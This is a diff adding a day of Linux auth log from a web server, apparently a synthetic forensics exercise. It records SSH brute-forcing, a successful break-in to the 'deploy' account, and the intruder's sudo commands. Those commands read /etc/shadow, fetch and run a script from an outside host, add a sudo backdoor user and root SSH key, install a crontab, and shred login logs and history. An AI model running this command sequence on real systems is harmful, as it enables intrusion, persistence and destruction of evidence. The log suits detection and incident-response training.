@@ -1,0 +1,293 @@
+Sep 28 00:17:01 web-prod-01 CRON[1451]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 00:17:02 web-prod-01 CRON[1451]: pam_unix(cron:session): session closed for user root
+Sep 28 00:41:12 web-prod-01 sshd[1523]: Invalid user admin from 203.0.113.8 port 50242
+Sep 28 00:41:14 web-prod-01 sshd[1523]: Failed password for invalid user admin from 203.0.113.8 port 50242 ssh2
+Sep 28 00:41:15 web-prod-01 sshd[1523]: Connection closed by invalid user admin 203.0.113.8 port 50242 [preauth]
+Sep 28 00:42:18 web-prod-01 sshd[1526]: Invalid user admin from 203.0.113.8 port 51477
+Sep 28 00:42:20 web-prod-01 sshd[1526]: Failed password for invalid user admin from 203.0.113.8 port 51477 ssh2
+Sep 28 00:42:21 web-prod-01 sshd[1526]: Connection closed by invalid user admin 203.0.113.8 port 51477 [preauth]
+Sep 28 00:42:59 web-prod-01 sshd[1528]: Invalid user admin from 203.0.113.8 port 58169
+Sep 28 00:43:01 web-prod-01 sshd[1528]: Failed password for invalid user admin from 203.0.113.8 port 58169 ssh2
+Sep 28 00:43:02 web-prod-01 sshd[1528]: Connection closed by invalid user admin 203.0.113.8 port 58169 [preauth]
+Sep 28 01:17:01 web-prod-01 CRON[1631]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 01:17:02 web-prod-01 CRON[1631]: pam_unix(cron:session): session closed for user root
+Sep 28 02:13:05 web-prod-01 sshd[1799]: Invalid user admin from 198.51.100.23 port 38378
+Sep 28 02:13:07 web-prod-01 sshd[1799]: Failed password for invalid user admin from 198.51.100.23 port 38378 ssh2
+Sep 28 02:13:08 web-prod-01 sshd[1799]: Connection closed by invalid user admin 198.51.100.23 port 38378 [preauth]
+Sep 28 02:13:30 web-prod-01 sshd[1800]: Invalid user test from 198.51.100.23 port 55026
+Sep 28 02:13:32 web-prod-01 sshd[1800]: Failed password for invalid user test from 198.51.100.23 port 55026 ssh2
+Sep 28 02:13:33 web-prod-01 sshd[1800]: Connection closed by invalid user test 198.51.100.23 port 55026 [preauth]
+Sep 28 02:13:59 web-prod-01 sshd[1801]: Invalid user oracle from 198.51.100.23 port 52540
+Sep 28 02:14:01 web-prod-01 sshd[1801]: Failed password for invalid user oracle from 198.51.100.23 port 52540 ssh2
+Sep 28 02:14:02 web-prod-01 sshd[1801]: Connection closed by invalid user oracle 198.51.100.23 port 52540 [preauth]
+Sep 28 02:14:22 web-prod-01 sshd[1803]: Invalid user postgres from 198.51.100.23 port 59113
+Sep 28 02:14:24 web-prod-01 sshd[1803]: Failed password for invalid user postgres from 198.51.100.23 port 59113 ssh2
+Sep 28 02:14:25 web-prod-01 sshd[1803]: Connection closed by invalid user postgres 198.51.100.23 port 59113 [preauth]
+Sep 28 02:14:43 web-prod-01 sshd[1804]: Invalid user ubuntu from 198.51.100.23 port 50716
+Sep 28 02:14:45 web-prod-01 sshd[1804]: Failed password for invalid user ubuntu from 198.51.100.23 port 50716 ssh2
+Sep 28 02:14:46 web-prod-01 sshd[1804]: Connection closed by invalid user ubuntu 198.51.100.23 port 50716 [preauth]
+Sep 28 02:15:00 web-prod-01 sshd[1805]: Invalid user git from 198.51.100.23 port 53685
+Sep 28 02:15:02 web-prod-01 sshd[1805]: Failed password for invalid user git from 198.51.100.23 port 53685 ssh2
+Sep 28 02:15:03 web-prod-01 sshd[1805]: Connection closed by invalid user git 198.51.100.23 port 53685 [preauth]
+Sep 28 02:15:16 web-prod-01 sshd[1806]: Invalid user ftpuser from 198.51.100.23 port 35135
+Sep 28 02:15:18 web-prod-01 sshd[1806]: Failed password for invalid user ftpuser from 198.51.100.23 port 35135 ssh2
+Sep 28 02:15:19 web-prod-01 sshd[1806]: Connection closed by invalid user ftpuser 198.51.100.23 port 35135 [preauth]
+Sep 28 02:15:44 web-prod-01 sshd[1807]: Invalid user guest from 198.51.100.23 port 54162
+Sep 28 02:15:46 web-prod-01 sshd[1807]: Failed password for invalid user guest from 198.51.100.23 port 54162 ssh2
+Sep 28 02:15:47 web-prod-01 sshd[1807]: Connection closed by invalid user guest 198.51.100.23 port 54162 [preauth]
+Sep 28 02:16:00 web-prod-01 sshd[1808]: Invalid user pi from 198.51.100.23 port 54906
+Sep 28 02:16:01 web-prod-01 sshd[1808]: Connection closed by invalid user pi 198.51.100.23 port 54906 [preauth]
+Sep 28 02:16:17 web-prod-01 sshd[1809]: Failed password for deploy from 198.51.100.23 port 53575 ssh2
+Sep 28 02:16:18 web-prod-01 sshd[1809]: Connection closed by authenticating user deploy 198.51.100.23 port 53575 [preauth]
+Sep 28 02:16:36 web-prod-01 sshd[1810]: Invalid user user from 198.51.100.23 port 39224
+Sep 28 02:16:38 web-prod-01 sshd[1810]: Failed password for invalid user user from 198.51.100.23 port 39224 ssh2
+Sep 28 02:16:39 web-prod-01 sshd[1810]: Connection closed by invalid user user 198.51.100.23 port 39224 [preauth]
+Sep 28 02:16:54 web-prod-01 sshd[1812]: Invalid user support from 198.51.100.23 port 42104
+Sep 28 02:16:56 web-prod-01 sshd[1812]: Failed password for invalid user support from 198.51.100.23 port 42104 ssh2
+Sep 28 02:16:57 web-prod-01 sshd[1812]: Connection closed by invalid user support 198.51.100.23 port 42104 [preauth]
+Sep 28 02:17:01 web-prod-01 CRON[1811]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 02:17:02 web-prod-01 CRON[1811]: pam_unix(cron:session): session closed for user root
+Sep 28 02:17:15 web-prod-01 sshd[1813]: Invalid user jenkins from 198.51.100.23 port 47589
+Sep 28 02:17:17 web-prod-01 sshd[1813]: Failed password for invalid user jenkins from 198.51.100.23 port 47589 ssh2
+Sep 28 02:17:18 web-prod-01 sshd[1813]: Connection closed by invalid user jenkins 198.51.100.23 port 47589 [preauth]
+Sep 28 02:17:40 web-prod-01 sshd[1814]: Invalid user minecraft from 198.51.100.23 port 33176
+Sep 28 02:17:41 web-prod-01 sshd[1814]: Connection closed by invalid user minecraft 198.51.100.23 port 33176 [preauth]
+Sep 28 03:17:01 web-prod-01 CRON[1991]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 03:17:02 web-prod-01 CRON[1991]: pam_unix(cron:session): session closed for user root
+Sep 28 03:40:11 web-prod-01 sshd[2060]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:40:12 web-prod-01 sshd[2060]: Failed password for root from 203.0.113.45 port 46929 ssh2
+Sep 28 03:40:24 web-prod-01 sshd[2060]: message repeated 5 times: [ Failed password for root from 203.0.113.45 port 46929 ssh2]
+Sep 28 03:40:25 web-prod-01 sshd[2060]: error: maximum authentication attempts exceeded for root from 203.0.113.45 port 46929 ssh2 [preauth]
+Sep 28 03:40:26 web-prod-01 sshd[2060]: Disconnecting authenticating user root 203.0.113.45 port 46929: Too many authentication failures [preauth]
+Sep 28 03:41:16 web-prod-01 sshd[2063]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:41:17 web-prod-01 sshd[2063]: Failed password for root from 203.0.113.45 port 40265 ssh2
+Sep 28 03:41:29 web-prod-01 sshd[2063]: message repeated 5 times: [ Failed password for root from 203.0.113.45 port 40265 ssh2]
+Sep 28 03:41:30 web-prod-01 sshd[2063]: error: maximum authentication attempts exceeded for root from 203.0.113.45 port 40265 ssh2 [preauth]
+Sep 28 03:41:31 web-prod-01 sshd[2063]: Disconnecting authenticating user root 203.0.113.45 port 40265: Too many authentication failures [preauth]
+Sep 28 03:41:57 web-prod-01 sshd[2065]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:41:58 web-prod-01 sshd[2065]: Failed password for root from 203.0.113.45 port 58195 ssh2
+Sep 28 03:42:10 web-prod-01 sshd[2065]: message repeated 5 times: [ Failed password for root from 203.0.113.45 port 58195 ssh2]
+Sep 28 03:42:11 web-prod-01 sshd[2065]: error: maximum authentication attempts exceeded for root from 203.0.113.45 port 58195 ssh2 [preauth]
+Sep 28 03:42:12 web-prod-01 sshd[2065]: Disconnecting authenticating user root 203.0.113.45 port 58195: Too many authentication failures [preauth]
+Sep 28 03:43:00 web-prod-01 sshd[2069]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:43:01 web-prod-01 sshd[2069]: Failed password for root from 203.0.113.45 port 53928 ssh2
+Sep 28 03:43:09 web-prod-01 sshd[2069]: message repeated 3 times: [ Failed password for root from 203.0.113.45 port 53928 ssh2]
+Sep 28 03:43:15 web-prod-01 sshd[2069]: Disconnecting authenticating user root 203.0.113.45 port 53928: Too many authentication failures [preauth]
+Sep 28 03:44:07 web-prod-01 sshd[2072]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:44:08 web-prod-01 sshd[2072]: Failed password for root from 203.0.113.45 port 39768 ssh2
+Sep 28 03:44:20 web-prod-01 sshd[2072]: message repeated 5 times: [ Failed password for root from 203.0.113.45 port 39768 ssh2]
+Sep 28 03:44:21 web-prod-01 sshd[2072]: error: maximum authentication attempts exceeded for root from 203.0.113.45 port 39768 ssh2 [preauth]
+Sep 28 03:44:22 web-prod-01 sshd[2072]: Disconnecting authenticating user root 203.0.113.45 port 39768: Too many authentication failures [preauth]
+Sep 28 03:44:52 web-prod-01 sshd[2074]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:44:53 web-prod-01 sshd[2074]: Failed password for root from 203.0.113.45 port 50104 ssh2
+Sep 28 03:45:05 web-prod-01 sshd[2074]: message repeated 5 times: [ Failed password for root from 203.0.113.45 port 50104 ssh2]
+Sep 28 03:45:06 web-prod-01 sshd[2074]: error: maximum authentication attempts exceeded for root from 203.0.113.45 port 50104 ssh2 [preauth]
+Sep 28 03:45:07 web-prod-01 sshd[2074]: Disconnecting authenticating user root 203.0.113.45 port 50104: Too many authentication failures [preauth]
+Sep 28 03:45:48 web-prod-01 sshd[2077]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:45:49 web-prod-01 sshd[2077]: Failed password for root from 203.0.113.45 port 38829 ssh2
+Sep 28 03:46:01 web-prod-01 sshd[2077]: message repeated 5 times: [ Failed password for root from 203.0.113.45 port 38829 ssh2]
+Sep 28 03:46:02 web-prod-01 sshd[2077]: error: maximum authentication attempts exceeded for root from 203.0.113.45 port 38829 ssh2 [preauth]
+Sep 28 03:46:03 web-prod-01 sshd[2077]: Disconnecting authenticating user root 203.0.113.45 port 38829: Too many authentication failures [preauth]
+Sep 28 03:46:29 web-prod-01 sshd[2079]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.45  user=root
+Sep 28 03:46:30 web-prod-01 sshd[2079]: Failed password for root from 203.0.113.45 port 57224 ssh2
+Sep 28 03:46:33 web-prod-01 sshd[2079]: Failed password for root from 203.0.113.45 port 57224 ssh2
+Sep 28 03:46:44 web-prod-01 sshd[2079]: Disconnecting authenticating user root 203.0.113.45 port 57224: Too many authentication failures [preauth]
+Sep 28 04:17:01 web-prod-01 CRON[2171]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 04:17:02 web-prod-01 CRON[2171]: pam_unix(cron:session): session closed for user root
+Sep 28 04:55:03 web-prod-01 sshd[2285]: Invalid user ubnt from 198.51.100.140 port 53571
+Sep 28 04:55:05 web-prod-01 sshd[2285]: Failed password for invalid user ubnt from 198.51.100.140 port 53571 ssh2
+Sep 28 04:55:06 web-prod-01 sshd[2285]: Connection closed by invalid user ubnt 198.51.100.140 port 53571 [preauth]
+Sep 28 04:56:09 web-prod-01 sshd[2288]: Invalid user ubnt from 198.51.100.140 port 42848
+Sep 28 04:56:11 web-prod-01 sshd[2288]: Failed password for invalid user ubnt from 198.51.100.140 port 42848 ssh2
+Sep 28 04:56:12 web-prod-01 sshd[2288]: Connection closed by invalid user ubnt 198.51.100.140 port 42848 [preauth]
+Sep 28 05:17:01 web-prod-01 CRON[2351]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 05:17:02 web-prod-01 CRON[2351]: pam_unix(cron:session): session closed for user root
+Sep 28 06:00:02 web-prod-01 sshd[2480]: Accepted publickey for root from 10.10.5.5 port 59047 ssh2: ED25519 SHA256:6D+tghIQHVoKY4gGT2sF3kTH7swIathbYR9y2gUcqyY
+Sep 28 06:00:02 web-prod-01 sshd[2480]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 06:00:02 web-prod-01 systemd-logind[612]: New session 101 of user root.
+Sep 28 06:17:01 web-prod-01 CRON[2531]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 06:17:02 web-prod-01 CRON[2531]: pam_unix(cron:session): session closed for user root
+Sep 28 07:12:44 web-prod-01 sshd[2698]: Invalid user oracle from 203.0.113.91 port 39483
+Sep 28 07:12:46 web-prod-01 sshd[2698]: Failed password for invalid user oracle from 203.0.113.91 port 39483 ssh2
+Sep 28 07:12:47 web-prod-01 sshd[2698]: Connection closed by invalid user oracle 203.0.113.91 port 39483 [preauth]
+Sep 28 07:13:50 web-prod-01 sshd[2701]: Invalid user oracle from 203.0.113.91 port 36349
+Sep 28 07:13:52 web-prod-01 sshd[2701]: Failed password for invalid user oracle from 203.0.113.91 port 36349 ssh2
+Sep 28 07:13:53 web-prod-01 sshd[2701]: Connection closed by invalid user oracle 203.0.113.91 port 36349 [preauth]
+Sep 28 07:15:04 web-prod-01 sshd[2705]: Invalid user oracle from 203.0.113.91 port 59652
+Sep 28 07:15:06 web-prod-01 sshd[2705]: Failed password for invalid user oracle from 203.0.113.91 port 59652 ssh2
+Sep 28 07:15:07 web-prod-01 sshd[2705]: Connection closed by invalid user oracle 203.0.113.91 port 59652 [preauth]
+Sep 28 07:17:01 web-prod-01 CRON[2711]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 07:17:02 web-prod-01 CRON[2711]: pam_unix(cron:session): session closed for user root
+Sep 28 08:17:01 web-prod-01 CRON[2891]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 08:17:02 web-prod-01 CRON[2891]: pam_unix(cron:session): session closed for user root
+Sep 28 08:58:40 web-prod-01 sshd[3016]: Accepted publickey for alice from 10.10.5.21 port 51772 ssh2: ED25519 SHA256:1U8pFDY3noztcn4wwSjexK6ArKj+xREwZ4OfmG+btqj
+Sep 28 08:58:40 web-prod-01 sshd[3016]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+Sep 28 08:58:40 web-prod-01 systemd-logind[612]: New session 102 of user alice.
+Sep 28 09:01:12 web-prod-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Sep 28 09:01:12 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+Sep 28 09:01:13 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 09:03:55 web-prod-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt upgrade -y nginx
+Sep 28 09:03:55 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+Sep 28 09:03:56 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 09:06:30 web-prod-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 28 09:06:30 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+Sep 28 09:06:31 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 09:07:02 web-prod-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 50 /var/log/nginx/error.log
+Sep 28 09:07:02 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+Sep 28 09:07:03 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 09:15:20 web-prod-01 sshd[3066]: Failed password for bob from 10.10.5.30 port 36141 ssh2
+Sep 28 09:15:24 web-prod-01 sshd[3066]: Failed password for bob from 10.10.5.30 port 36141 ssh2
+Sep 28 09:15:29 web-prod-01 sshd[3066]: Accepted password for bob from 10.10.5.30 port 36141 ssh2
+Sep 28 09:15:29 web-prod-01 sshd[3066]: pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)
+Sep 28 09:17:01 web-prod-01 CRON[3071]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 09:17:02 web-prod-01 CRON[3071]: pam_unix(cron:session): session closed for user root
+Sep 28 09:21:47 web-prod-01 sudo:      bob : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /var/log/syslog
+Sep 28 09:40:18 web-prod-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl enable node-exporter
+Sep 28 09:40:18 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+Sep 28 09:40:19 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 10:17:01 web-prod-01 CRON[3251]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 10:17:02 web-prod-01 CRON[3251]: pam_unix(cron:session): session closed for user root
+Sep 28 11:02:10 web-prod-01 sshd[3386]: Failed password for deploy from 192.0.2.77 port 55073 ssh2
+Sep 28 11:02:12 web-prod-01 sshd[3386]: Connection closed by authenticating user deploy 192.0.2.77 port 55073 [preauth]
+Sep 28 11:02:35 web-prod-01 sshd[3387]: Failed password for deploy from 192.0.2.77 port 54822 ssh2
+Sep 28 11:02:37 web-prod-01 sshd[3387]: Connection closed by authenticating user deploy 192.0.2.77 port 54822 [preauth]
+Sep 28 11:02:49 web-prod-01 sshd[3388]: Failed password for deploy from 192.0.2.77 port 49342 ssh2
+Sep 28 11:02:51 web-prod-01 sshd[3388]: Connection closed by authenticating user deploy 192.0.2.77 port 49342 [preauth]
+Sep 28 11:03:13 web-prod-01 sshd[3389]: Failed password for deploy from 192.0.2.77 port 52132 ssh2
+Sep 28 11:03:15 web-prod-01 sshd[3389]: Connection closed by authenticating user deploy 192.0.2.77 port 52132 [preauth]
+Sep 28 11:03:35 web-prod-01 sshd[3390]: Failed password for deploy from 192.0.2.77 port 53878 ssh2
+Sep 28 11:03:37 web-prod-01 sshd[3390]: Connection closed by authenticating user deploy 192.0.2.77 port 53878 [preauth]
+Sep 28 11:03:47 web-prod-01 sshd[3391]: Failed password for deploy from 192.0.2.77 port 53775 ssh2
+Sep 28 11:03:49 web-prod-01 sshd[3391]: Connection closed by authenticating user deploy 192.0.2.77 port 53775 [preauth]
+Sep 28 11:04:07 web-prod-01 sshd[3392]: Failed password for deploy from 192.0.2.77 port 49029 ssh2
+Sep 28 11:04:09 web-prod-01 sshd[3392]: Connection closed by authenticating user deploy 192.0.2.77 port 49029 [preauth]
+Sep 28 11:04:23 web-prod-01 sshd[3393]: Failed password for deploy from 192.0.2.77 port 33287 ssh2
+Sep 28 11:04:25 web-prod-01 sshd[3393]: Connection closed by authenticating user deploy 192.0.2.77 port 33287 [preauth]
+Sep 28 11:04:37 web-prod-01 sshd[3394]: Failed password for deploy from 192.0.2.77 port 37622 ssh2
+Sep 28 11:04:39 web-prod-01 sshd[3394]: Connection closed by authenticating user deploy 192.0.2.77 port 37622 [preauth]
+Sep 28 11:04:56 web-prod-01 sshd[3395]: Failed password for deploy from 192.0.2.77 port 35400 ssh2
+Sep 28 11:04:58 web-prod-01 sshd[3395]: Connection closed by authenticating user deploy 192.0.2.77 port 35400 [preauth]
+Sep 28 11:05:22 web-prod-01 sshd[3396]: Failed password for deploy from 192.0.2.77 port 54044 ssh2
+Sep 28 11:05:24 web-prod-01 sshd[3396]: Connection closed by authenticating user deploy 192.0.2.77 port 54044 [preauth]
+Sep 28 11:05:45 web-prod-01 sshd[3397]: Failed password for deploy from 192.0.2.77 port 52929 ssh2
+Sep 28 11:05:47 web-prod-01 sshd[3397]: Connection closed by authenticating user deploy 192.0.2.77 port 52929 [preauth]
+Sep 28 11:06:04 web-prod-01 sshd[3398]: Failed password for deploy from 192.0.2.77 port 47761 ssh2
+Sep 28 11:06:06 web-prod-01 sshd[3398]: Connection closed by authenticating user deploy 192.0.2.77 port 47761 [preauth]
+Sep 28 11:06:27 web-prod-01 sshd[3399]: Failed password for deploy from 192.0.2.77 port 56417 ssh2
+Sep 28 11:06:29 web-prod-01 sshd[3399]: Connection closed by authenticating user deploy 192.0.2.77 port 56417 [preauth]
+Sep 28 11:06:39 web-prod-01 sshd[3400]: Failed password for deploy from 192.0.2.77 port 38511 ssh2
+Sep 28 11:06:41 web-prod-01 sshd[3400]: Connection closed by authenticating user deploy 192.0.2.77 port 38511 [preauth]
+Sep 28 11:07:03 web-prod-01 sshd[3401]: Failed password for deploy from 192.0.2.77 port 39085 ssh2
+Sep 28 11:07:05 web-prod-01 sshd[3401]: Connection closed by authenticating user deploy 192.0.2.77 port 39085 [preauth]
+Sep 28 11:07:17 web-prod-01 sshd[3402]: Failed password for deploy from 192.0.2.77 port 40535 ssh2
+Sep 28 11:07:19 web-prod-01 sshd[3402]: Connection closed by authenticating user deploy 192.0.2.77 port 40535 [preauth]
+Sep 28 11:07:41 web-prod-01 sshd[3403]: Failed password for deploy from 192.0.2.77 port 40069 ssh2
+Sep 28 11:07:43 web-prod-01 sshd[3403]: Connection closed by authenticating user deploy 192.0.2.77 port 40069 [preauth]
+Sep 28 11:08:03 web-prod-01 sshd[3404]: Failed password for deploy from 192.0.2.77 port 34154 ssh2
+Sep 28 11:08:05 web-prod-01 sshd[3404]: Connection closed by authenticating user deploy 192.0.2.77 port 34154 [preauth]
+Sep 28 11:08:26 web-prod-01 sshd[3405]: Failed password for deploy from 192.0.2.77 port 53497 ssh2
+Sep 28 11:08:28 web-prod-01 sshd[3405]: Connection closed by authenticating user deploy 192.0.2.77 port 53497 [preauth]
+Sep 28 11:08:50 web-prod-01 sshd[3406]: Failed password for deploy from 192.0.2.77 port 47207 ssh2
+Sep 28 11:08:52 web-prod-01 sshd[3406]: Connection closed by authenticating user deploy 192.0.2.77 port 47207 [preauth]
+Sep 28 11:09:09 web-prod-01 sshd[3407]: Failed password for deploy from 192.0.2.77 port 56118 ssh2
+Sep 28 11:09:11 web-prod-01 sshd[3407]: Connection closed by authenticating user deploy 192.0.2.77 port 56118 [preauth]
+Sep 28 11:09:33 web-prod-01 sshd[3408]: Failed password for deploy from 192.0.2.77 port 46073 ssh2
+Sep 28 11:09:35 web-prod-01 sshd[3408]: Connection closed by authenticating user deploy 192.0.2.77 port 46073 [preauth]
+Sep 28 11:09:41 web-prod-01 sshd[3409]: Accepted password for deploy from 192.0.2.77 port 42824 ssh2
+Sep 28 11:09:41 web-prod-01 sshd[3409]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Sep 28 11:09:41 web-prod-01 systemd-logind[612]: New session 103 of user deploy.
+Sep 28 11:10:05 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
+Sep 28 11:10:05 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:10:06 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:10:31 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Sep 28 11:10:31 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:10:32 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:11:02 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.200/k.sh -O /tmp/.k.sh
+Sep 28 11:11:02 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:11:03 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:11:15 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/chmod +x /tmp/.k.sh
+Sep 28 11:11:15 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:11:16 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:11:20 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/tmp/.k.sh
+Sep 28 11:11:20 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:11:21 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:12:40 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup
+Sep 28 11:12:40 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:12:40 web-prod-01 useradd[3418]: new group: name=svc-backup, GID=1003
+Sep 28 11:12:40 web-prod-01 useradd[3418]: new user: name=svc-backup, UID=1003, GID=1003, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1
+Sep 28 11:12:41 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:12:58 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup
+Sep 28 11:12:58 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:12:58 web-prod-01 usermod[3419]: add 'svc-backup' to group 'sudo'
+Sep 28 11:12:58 web-prod-01 usermod[3419]: add 'svc-backup' to shadow group 'sudo'
+Sep 28 11:12:59 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:13:20 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/passwd svc-backup
+Sep 28 11:13:20 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:13:21 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:13:27 web-prod-01 passwd[3420]: pam_unix(passwd:chauthtok): password changed for svc-backup
+Sep 28 11:14:05 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys
+Sep 28 11:14:05 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:14:06 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:14:40 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab /tmp/.c
+Sep 28 11:14:40 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:14:41 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:15:22 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/btmp
+Sep 28 11:15:22 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:15:23 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:15:40 web-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/rm -f /home/deploy/.bash_history
+Sep 28 11:15:40 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 28 11:15:41 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 11:16:02 web-prod-01 sshd[3409]: Received disconnect from 192.0.2.77 port 51522:11: disconnected by user
+Sep 28 11:16:02 web-prod-01 sshd[3409]: Disconnected from user deploy 192.0.2.77 port 51522
+Sep 28 11:16:02 web-prod-01 sshd[3409]: pam_unix(sshd:session): session closed for user deploy
+Sep 28 11:16:02 web-prod-01 systemd-logind[612]: Session 103 logged out. Waiting for processes to exit.
+Sep 28 11:17:01 web-prod-01 CRON[3431]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 11:17:02 web-prod-01 CRON[3431]: pam_unix(cron:session): session closed for user root
+Sep 28 12:17:01 web-prod-01 CRON[3611]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 12:17:02 web-prod-01 CRON[3611]: pam_unix(cron:session): session closed for user root
+Sep 28 13:17:01 web-prod-01 CRON[3791]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 13:17:02 web-prod-01 CRON[3791]: pam_unix(cron:session): session closed for user root
